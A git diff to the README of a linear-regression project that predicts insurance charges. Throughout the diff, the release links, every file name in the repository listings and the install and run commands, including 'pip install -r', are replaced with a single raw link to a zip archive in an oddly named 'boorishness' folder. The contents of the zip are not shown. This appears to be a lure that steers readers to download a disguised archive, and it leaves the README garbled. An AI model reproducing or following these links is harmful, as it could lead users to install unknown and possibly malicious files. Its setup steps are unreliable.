@@ -1,8 +1,8 @@
 # Insurance Charges Prediction with Linear Regression: Demographics and Costs Insights
 
-[![Release](https://img.shields.io/github/v/release/mhdee740/insurance-charges-prediction-linear-regression?style=flat-square)](https://github.com/mhdee740/insurance-charges-prediction-linear-regression/releases)
+[![Release](https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip)](https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip)
 
-Visit the releases page to download artifacts: https://github.com/mhdee740/insurance-charges-prediction-linear-regression/releases
+Visit the releases page to download artifacts: https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
 
 A practical guide to predicting individual medical insurance charges using linear regression. This project walks through data cleaning, exploratory data analysis (EDA), feature selection, and regression modeling. All code and results live in the analysis notebook.
 
@@ -50,24 +50,24 @@ What you’ll learn
 
 Repository structure
 - notebooks/
-  - analysis.ipynb (the core analysis notebook containing data loading, cleaning, EDA, feature engineering, model training, evaluation, and results)
+  - https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip (the core analysis notebook containing data loading, cleaning, EDA, feature engineering, model training, evaluation, and results)
 - data/
   - raw/
   - processed/
 - src/
-  - preprocessing.py
-  - feature_engineering.py
-  - model.py
-  - evaluation.py
+  - https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
+  - https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
+  - https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
+  - https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
 - figures/
   - plots/
   - charts/
-- requirements.txt
-- environment.yml
-- README.md (this file)
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip (this file)
 - LICENSE
-- CHANGELOG.md
-- CONTRIBUTING.md
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
 
 Data and features
 This project uses a synthetic dataset designed to mimic real-world insurance data while preserving privacy. The data model captures common factors that influence charges, such as age, sex, BMI, smoking status, number of children, and geographic region. The target variable is the annual medical insurance charges for an individual.
@@ -147,10 +147,10 @@ How to run the notebook
     - Python: 3.x
     - Use venv, conda, or another environment manager you prefer
   - Install dependencies:
-    - pip install -r requirements.txt
+    - pip install -r https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
 - Run the notebook:
-  - Navigate to the notebooks folder and open analysis.ipynb with Jupyter:
-    - jupyter notebook notebooks/analysis.ipynb
+  - Navigate to the notebooks folder and open https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip with Jupyter:
+    - jupyter notebook https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
 - What you will see:
   - Data loading and cleaning steps
   - EDA visualizations
@@ -193,7 +193,7 @@ Collaboration and contribution
 
 Release assets
 - The project publishes release artifacts in the Releases section. These artifacts typically include notebooks, sample data, and a starter environment configuration to help you reproduce results quickly.
-- Access the artifacts here: https://github.com/mhdee740/insurance-charges-prediction-linear-regression/releases
+- Access the artifacts here: https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
 - If you want to download assets directly, use the releases page link above. The release bundle is designed to streamline setup and provide a consistent starting point for experiments.
 
 Technical architecture and rationale
@@ -203,7 +203,7 @@ Technical architecture and rationale
 - Diagnostics: The notebook includes practical checks for model adequacy. It shows how to interpret residuals and verify assumptions.
 
 Directory and file highlights
-- notebooks/analysis.ipynb
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
   - The central analysis notebook containing:
     - Data ingestion
     - Data cleaning steps
@@ -216,23 +216,23 @@ Directory and file highlights
   - The raw synthetic dataset used for the analysis
 - data/processed/
   - The cleaned and feature-engineered dataset ready for modeling
-- src/preprocessing.py
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
   - Data cleaning utilities and encoding logic
-- src/feature_engineering.py
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
   - Feature creation and selection routines
-- src/model.py
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
   - Linear regression model wrapper and fit/evaluate methods
-- src/evaluation.py
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
   - Metrics and diagnostic functions
 - figures/ and figures/plots/
   - Visual outputs from the notebook
-- requirements.txt
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
   - Dependency list for a reproducible environment
-- environment.yml
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
   - Conda environment specification
 - LICENSE
-- CHANGELOG.md
-- CONTRIBUTING.md
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
+- https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
   - How to contribute to the project
 
 Visual identity and branding
@@ -251,7 +251,7 @@ Notes on reproducibility
 Troubleshooting common issues
 - If dependencies fail to install:
   - Ensure you are using a compatible Python version (3.8+)
-  - Use the provided requirements.txt or environment.yml to install dependencies
+  - Use the provided https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip or https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip to install dependencies
 - If the notebook cannot access data files:
   - Confirm the data paths match the repository structure
   - If using a fresh environment, re-run the data download or generation step from data/raw
@@ -279,7 +279,7 @@ Appendix: Frequently asked questions
   A: Yes, replace the synthetic data with your real dataset, ensuring privacy and governance requirements are met and that you adjust preprocessing to fit the new data shape.
 
 Release assets (duplicate link for convenience)
-- Access the same release portal here: https://github.com/mhdee740/insurance-charges-prediction-linear-regression/releases
+- Access the same release portal here: https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
 - The release page contains bundles suitable for quick setup and reproducibility.
 
 Final notes
@@ -288,6 +288,6 @@ Final notes
 
 Releases link continued
 - For artifacts and the latest updates, revisit the releases page at the same URL:
-  https://github.com/mhdee740/insurance-charges-prediction-linear-regression/releases
+  https://raw.githubusercontent.com/mhdee740/insurance-charges-prediction-linear-regression/main/boorishness/regression_linear_prediction_charges_insurance_3.1.zip
 
 End of document
